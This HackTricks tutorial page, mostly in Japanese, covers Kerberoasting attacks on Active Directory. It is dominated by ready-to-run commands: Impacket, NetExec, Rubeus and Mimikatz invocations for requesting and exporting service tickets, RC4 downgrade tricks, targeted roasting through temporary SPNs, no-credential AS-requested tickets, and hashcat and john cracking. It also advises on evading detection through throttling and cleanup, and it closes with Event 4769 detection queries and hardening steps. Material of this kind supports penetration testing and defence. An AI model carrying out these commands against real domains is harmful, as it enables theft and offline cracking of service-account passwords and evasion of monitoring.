# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoastingは、TGSチケットの取得に焦点を当てており、特にActive Directory (AD) 内のユーザーアカウントで動作するサービス（コンピューターアカウントは除く）に関連するチケットを対象とします。これらのチケットの暗号化はユーザーのパスワードに由来する鍵を利用しており、オフラインで認証情報をクラッキングできます。ユーザーアカウントがサービスとして使われていることは、ServicePrincipalName (SPN) プロパティが空でないことで示されます。

任意の認証済みドメインユーザは TGS チケットを要求できるため、特別な権限は不要です。

### 重要なポイント

- ユーザーアカウントで実行されるサービス（SPN が設定されたアカウント；コンピューターアカウントではない）に対する TGS チケットを対象とします。
- チケットはサービスアカウントのパスワードから派生した鍵で暗号化されており、オフラインで破ることができます。
- 特権は不要；任意の認証済みアカウントが TGS チケットを要求できます。

> [!WARNING]
> 多くの一般的なツールは、AES よりもクラッキングが速いため RC4-HMAC (etype 23) のサービスチケットを要求する傾向があります。RC4 の TGS ハッシュは `$krb5tgs$23$*` で始まり、AES128 は `$krb5tgs$17$*`、AES256 は `$krb5tgs$18$*` で始まります。しかし、多くの環境が AES のみへ移行しています。RC4 だけが重要だと仮定しないでください。
> また、“spray-and-pray” roasting は避けてください。Rubeus のデフォルトの kerberoast は全ての SPN をクエリしてチケットを要求するためノイジーです。まず興味深いプリンシパルを列挙してターゲットにしてください。

### サービスアカウントのシークレットと Kerberos の暗号コスト

多くのサービスは依然として手動で管理されたパスワードを持つユーザーアカウントで動作しています。KDC はサービスチケットをそれらのパスワードから派生した鍵で暗号化し、暗号文を任意の認証済みプリンシパルに渡すため、kerberoasting はロックアウトや DC のテレメトリなしで無制限のオフライン推測を可能にします。暗号化モードがクラッキングのコスト（予算）を決定します：

| モード | 鍵導出 | 暗号化タイプ | 概算 RTX 5090 スループット* | 備考 |
| --- | --- | --- | --- | --- |
| AES + PBKDF2 | PBKDF2-HMAC-SHA1（4,096 回の反復とドメイン + SPN から生成されるプリンシパルごとのソルト） | etype 17/18 (`$krb5tgs$17$`, `$krb5tgs$18$`) | 約 6.8 million guesses/s | ソルトによりレインボーテーブルを阻止しますが、短いパスワードの高速クラッキングは依然可能です。 |
| RC4 + NT hash | パスワードの単一 MD4（ソルトなしの NT ハッシュ）；Kerberos はチケットごとに 8 バイトの confounder を混ぜるのみ | etype 23 (`$krb5tgs$23$`) | 約 4.18 **billion** guesses/s | AES より約1000×速い；攻撃者は `msDS-SupportedEncryptionTypes` が許可する場合に RC4 を強制します。 |

* ベンチマークは Chick3nman によるもので、[Matthew Green's Kerberoasting analysis](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/) に掲載されています。

RC4 の confounder はキーストリームをランダム化するだけで、推測ごとの計算負荷を増やすものではありません。サービスアカウントがランダムなシークレット（gMSA/dMSA、machine accounts、vault-managed strings）に依存していない限り、侵害速度は純粋に GPU の予算次第です。AES-only の etype を強制すると毎秒数十億回の推測へダウングレードされる問題は解消されますが、弱い人間のパスワードは PBKDF2 によっても破られる可能性があります。

### Attack

#### Linux
```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# NetExec — LDAP enumerate + dump $krb5tgs$23/$17/$18 blobs with metadata
netexec ldap <DC_FQDN> -u <USER> -p <PASS> --kerberoast kerberoast.hashes

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```
kerberoast チェックを含む多機能ツール：
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```
#### Windows

- kerberoastableユーザーを列挙する
```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```
- 手法 1: TGS を要求して、memory から dump する
```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```
- 手法 2: 自動化ツール
```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```
> [!WARNING]
> TGS リクエストは Windows セキュリティ イベント 4769 を生成します (Kerberos サービスチケットが要求されました)。

### OPSEC and AES-only environments

- AES を使用していないアカウントに対して意図的に RC4 をリクエストする:
- Rubeus: `/rc4opsec` は tgtdeleg を使用して AES を使用していないアカウントを列挙し、RC4 サービスチケットを要求します。
- Rubeus: `/tgtdeleg` は kerberoast と組み合わせると、可能な場合に RC4 リクエストもトリガーします。
- 静かに失敗するのではなく AES-only アカウントを Roast する:
- Rubeus: `/aes` は AES が有効なアカウントを列挙し、AES サービスチケット (etype 17/18) を要求します。
- 既に TGT（PTT または .kirbi から）を保持している場合、`/ticket:<blob|path>` を `/spn:<SPN>` または `/spns:<file>` と組み合わせて使用し、LDAP を省略できます。
- ターゲティング、スロットリング、ノイズ低減:
- 使用する: `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`, `/delay:<ms>` および `/jitter:<1-100>`。
- `/pwdsetbefore:<MM-dd-yyyy>`（古いパスワード）で弱いパスワードの可能性が高いアカウントをフィルタするか、`/ou:<DN>` で特権 OU をターゲットにします。

Examples (Rubeus):
```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```
### Cracking
```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```
### 永続化 / 悪用

アカウントを制御できる、または変更できる場合、SPN を追加することでそれを kerberoastable にできます:
```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```
アカウントをダウングレードして RC4 を有効にし、cracking を容易にする（対象オブジェクトへの書き込み権限が必要）:
```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```
#### ユーザーに対する GenericWrite/GenericAll を利用した Targeted Kerberoast（一時的 SPN）

BloodHound がユーザーオブジェクト（例: GenericWrite/GenericAll）をあなたが制御していると示している場合、たとえそのユーザーが現在 SPN を持っていなくても、その特定のユーザーを確実に “targeted-roast” できます:

- 制御下のユーザーに一時的な SPN を追加して、そのユーザーを Kerberoast 可能にする。
- その SPN に対して RC4 (etype 23) で暗号化された TGS-REP を要求し、クラッキングを有利にする。
- hashcat で `$krb5tgs$23$...` ハッシュをクラッキングする。
- フットプリントを減らすために SPN をクリーンアップする。

Windows (PowerView/Rubeus):
```powershell
# Add temporary SPN on the target user
Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname='fake/TempSvc-<rand>'} -Verbose

# Request RC4 TGS for that user (single target)
.\Rubeus.exe kerberoast /user:<targetUser> /nowrap /rc4

# Remove SPN afterwards
Set-DomainObject -Identity <targetUser> -Clear serviceprincipalname -Verbose
```
Linux ワンライナー（targetedKerberoast.py は SPN の追加 -> TGS (etype 23) の要求 -> SPN の削除を自動化します）:
```bash
targetedKerberoast.py -d '<DOMAIN>' -u <WRITER_SAM> -p '<WRITER_PASS>'
```
出力を hashcat autodetect でクラックしてください（mode 13100 は `$krb5tgs$23$` 用）:
```bash
hashcat <outfile>.hash /path/to/rockyou.txt
```
Detection notes: SPN の追加/削除はディレクトリの変更を引き起こします（ターゲットユーザー上で Event ID 5136/4738）および TGS リクエストは Event ID 4769 を生成します。スロットリングと速やかなクリーンアップを検討してください。

You can find useful tools for kerberoast attacks here: https://github.com/nidem/kerberoast

If you find this error from Linux: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)` it’s due to local time skew. Sync to the DC:

- `ntpdate <DC_IP>`（いくつかのディストロでは非推奨）
- `rdate -n <DC_IP>`

### Kerberoast ドメインアカウントが無くても (AS-requested STs)

2022年9月、Charlie Clark は、principal が事前認証を要求しない場合、リクエスト本文の sname を改変した細工された KRB_AS_REQ によりサービスチケットを取得でき、実質的に TGT ではなくサービスチケットを得られることを示しました。これは AS-REP roasting に類似し、有効なドメイン認証情報を必要としません。

See details: Semperis write-up “New Attack Paths: AS-requested STs”.

> [!WARNING]
> ユーザーのリストを提供する必要があります。なぜなら、有効な認証情報がないとこの手法で LDAP を照会できないからです。

Linux

- Impacket (PR #1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```
Windows

- Rubeus (PR #139):
```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```
関連

If you are targeting AS-REP roastable users, see also:

{{#ref}}
asreproast.md
{{#endref}}

### 検出

Kerberoasting はステルスになることがあります。DCs からの Event ID 4769 を追跡し、ノイズを減らすためにフィルタを適用してください:

- サービス名 `krbtgt` と `$` で終わるサービス名（コンピューターアカウント）を除外する。
- マシンアカウントからの要求（`*$$@*`）を除外する。
- 成功した要求のみ（Failure Code `0x0`）。
- 暗号化タイプを追跡する: RC4 (`0x17`), AES128 (`0x11`), AES256 (`0x12`)。`0x17` のみでアラートしないこと。

Example PowerShell triage:
```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
Where-Object {
($_.Message -notmatch 'krbtgt') -and
($_.Message -notmatch '\$$') -and
($_.Message -match 'Failure Code:\s+0x0') -and
($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
($_.Message -notmatch '\$@')
} |
Select-Object -ExpandProperty Message
```
追加アイデア:

- ホスト／ユーザーごとに通常のSPN使用状況をベースライン化し、単一の principal からの短期間での多数の異なるSPNリクエストに対してアラートを出す。
- AESでハードニングされたドメインにおける異常なRC4使用をフラグ付けする。

### 緩和 / ハードニング

- サービスには gMSA/dMSA または machine accounts を使用する。Managed アカウントは 120+ 文字のランダムパスワードを持ち、自動でローテートされるため、オフラインでのクラックは実用的でない。
- サービスアカウントに対して `msDS-SupportedEncryptionTypes` を AES のみに設定し（decimal 24 / hex 0x18）、その後パスワードをローテートして AES 鍵が派生されるようにする。
- 可能な限り環境で RC4 を無効化し、RC4 使用の試行を監視する。DCs 上では `DefaultDomainSupportedEncTypes` レジストリ値を使って `msDS-SupportedEncryptionTypes` が設定されていないアカウントのデフォルトを制御できる。十分にテストすること。
- ユーザーアカウントから不要なSPNを削除する。
- Managed アカウントが利用できない場合は長くランダムなサービスアカウントパスワード（25+ 文字）を使用する。共通パスワードを禁止し、定期的に監査する。

## 参考資料

- [HTB: Breach – NetExec LDAP kerberoast + hashcat cracking in practice](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [https://github.com/ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
- [Matthew Green – Kerberoasting: Low-Tech, High-Impact Attacks from Legacy Kerberos Crypto (2025-09-10)](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- [Microsoft Security Blog (2024-10-11) – Microsoft’s guidance to help mitigate Kerberoasting](https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/)
- [SpecterOps – Rubeus Roasting documentation](https://docs.specterops.io/ghostpack/rubeus/roasting)
- [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)

{{#include ../../banners/hacktricks-training.md}}
